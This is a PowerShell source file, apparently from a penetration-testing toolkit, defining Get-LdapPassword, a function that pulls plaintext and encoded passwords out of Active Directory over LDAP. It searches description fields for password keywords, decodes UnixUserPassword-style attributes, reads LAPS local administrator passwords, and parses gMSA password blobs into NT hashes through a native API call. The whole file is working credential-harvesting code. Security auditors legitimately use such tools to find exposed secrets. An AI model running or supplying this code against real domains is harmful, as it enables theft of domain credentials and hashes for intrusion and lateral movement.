function Get-LdapPassword {
<#
.SYNOPSIS
    Retrieve plaintext passwords from Active Directory.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-LdapPassword queries domain controller via LDAP protocol for accounts with common attributes containing passwords (UnixUserPassword, UserPassword, ms-MCS-AdmPwd, msDS-ManagedPassword and more).

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER Credential
    Specify the domain account to use.

.PARAMETER Attributes
    Specify specific attributes to search through.

.PARAMETER Keywords
    Specify specific keywords to search for.

.EXAMPLE
    PS C:\> Get-LdapPassword -Server ADATUM.CORP -Credential ADATUM\testuser

.EXAMPLE
    PS C:\> Get-LdapPassword -Server ADATUM.CORP -Attributes description,comment -Keywords pw,mdp
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Attributes = @("description"),

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Keywords = @("cred", "pass", "pw")
    )

    $searchString = "LDAP://$Server/RootDSE"
    $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
    $rootDN = $rootDSE.rootDomainNamingContext[0]
    $adsPath = "LDAP://$Server/$rootDN"

    # Searching for password in world-readable attributes
    $filter = ''
    foreach ($attribute in $Attributes) {
        foreach ($keyword in $Keywords) {
            $filter += "($attribute=*$keyword*)"
        }
    }
    $filter = "(&(objectClass=user)(|$filter))"
    Get-LdapObject -ADSpath $adsPath -Filter $filter -Credential $Credential | ForEach-Object {
        foreach ($attribute in $attributes) {
            if ($_.$attribute) {
                [pscustomobject] @{
                    SamAccountName = $_.sAMAccountName
                    Attribute = $attribute
                    Value = $_.$attribute
                }
            }
        }
    }

    # Searching for encoded password attributes
    # Reference: https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/
    $filter = ''
    $attributes = @("UnixUserPassword", "UserPassword", "msSFU30Password", "unicodePwd")
    foreach ($attribute in $Attributes) {
        $filter += "($attribute=*)"
    }
    $filter = "(&(objectClass=user)(|$filter))"
    Get-LdapObject -ADSpath $adsPath -Filter $filter -Credential $Credential | ForEach-Object {
        foreach ($attribute in $attributes) {
            if ($_.$attribute) {
                [pscustomobject] @{
                    SamAccountName = $_.sAMAccountName
                    Attribute = $attribute
                    Value = [Text.Encoding]::ASCII.GetString($_.$attribute)
                }
            }
        }
    }

    # Searching for LAPS passwords
    # Reference: https://adsecurity.org/?p=1790
    $filter = "(&(objectCategory=Computer)(ms-MCS-AdmPwd=*))"
    Get-LdapObject -ADSpath $adsPath -Filter $filter -Credential $Credential | ForEach-Object {
        if ($_.'ms-MCS-AdmPwd') {
            if ($_.'ms-MCS-AdmPwdExpirationTime' -ge 0) {
                $expiration = $([datetime]::FromFileTime([convert]::ToInt64($_.'ms-MCS-AdmPwdExpirationTime',10)))
            }
            else{
                $expiration = 'N/A'
            }
            [pscustomobject] @{
                SamAccountName = $_.sAMAccountName
                Attribute = 'ms-MCS-AdmPwd'
                Value = $_.'ms-MCS-AdmPwd'
                #Expiration = $expiration
            }
        }
    }

    # Searching for GMSA passwords
    # Reference: https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/
    $filter = "(&(objectClass=msDS-GroupManagedServiceAccount)(msDS-ManagedPasswordId=*))"
    Get-LdapObject -ADSpath $adsPath -Filter $filter -Credential $Credential | ForEach-Object {
        if ($_.'msDS-ManagedPassword') {
            [pscustomobject] @{
                SamAccountName = $_.sAMAccountName
                Attribute = 'msDS-ManagedPassword'
                Value = ConvertTo-NTHash -Password (ConvertFrom-ADManagedPasswordBlob -Blob $_.'msDS-ManagedPassword').CurrentPassword
            }
        }
    }
}

function Local:ConvertFrom-ADManagedPasswordBlob {
    Param (
        [byte[]] $Blob
    )
    $stream = New-object IO.MemoryStream($Blob)
    $reader = New-Object IO.BinaryReader($stream)
    $version = $reader.ReadInt16()
    $reserved = $reader.ReadInt16()
    $length = $reader.ReadInt32()
    $currentPasswordOffset = $reader.ReadInt16()
    $secureCurrentPassword = ReadSecureWString -Buffer $blob -StartIndex $currentPasswordOffset
    $previousPasswordOffset = $reader.ReadInt16()
    [SecureString] $securePreviousPassword = $null
    if($previousPasswordOffset > 0) {
        $securePreviousPassword = ReadSecureWString -Buffer $blob -StartIndex $previousPasswordOffset
    }
    $queryPasswordIntervalOffset = $reader.ReadInt16()
    $queryPasswordIntervalBinary = [BitConverter]::ToInt64($blob, $queryPasswordIntervalOffset)
    $queryPasswordInterval = [TimeSpan]::FromTicks($queryPasswordIntervalBinary)
    $unchangedPasswordIntervalOffset = $reader.ReadInt16()
    $unchangedPasswordIntervalBinary = [BitConverter]::ToInt64($blob, $unchangedPasswordIntervalOffset)
    $unchangedPasswordInterval = [TimeSpan]::FromTicks($unchangedPasswordIntervalBinary)
    New-Object PSObject -Property @{
        CurrentPassword = $secureCurrentPassword.ToUnicodeString()
        PreviousPassword = $securePreviousPassword.ToUnicodeString()
        QueryPasswordInterval = $queryPasswordInterval
        UnchangedPasswordInterval = $unchangedPasswordInterval
    }
}

function Local:ReadSecureWString {
    Param (
        [byte[]] $Buffer,
        [int] $StartIndex
    )
    $maxLength = $Buffer.Length - $StartIndex;
    $result = New-Object SecureString
    for ($i = $startIndex; $i -lt $buffer.Length; $i += [Text.UnicodeEncoding]::CharSize) {
        $c = [BitConverter]::ToChar($buffer, $i)
        if ($c -eq [Char]::MinValue) {
            return $result
        }
        $result.AppendChar($c)
    }
}

function Local:ConvertTo-NTHash {
    Param (
        [string] $Password
    )
    $ntHash = New-Object byte[] 16
    $unicodePassword = New-Object Win32+UNICODE_STRING $Password
    [Win32]::RtlCalculateNtOwfPassword([ref] $unicodePassword, $ntHash) | Out-Null
    $unicodePassword.Dispose()
    return (($ntHash | ForEach-Object ToString X2) -join '')
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError = true, EntryPoint = "SystemFunction007", CharSet = CharSet.Unicode)]
    public static extern int RtlCalculateNtOwfPassword(ref UNICODE_STRING password, [MarshalAs(UnmanagedType.LPArray)] byte[] hash);

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING : IDisposable {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;

        public UNICODE_STRING(string s) {
            Length = (ushort)(s.Length * 2);
            MaximumLength = (ushort)(Length + 2);
            buffer = Marshal.StringToHGlobalUni(s);
        }

        public void Dispose() {
            Marshal.FreeHGlobal(buffer);
            buffer = IntPtr.Zero;
        }
    }
}
"@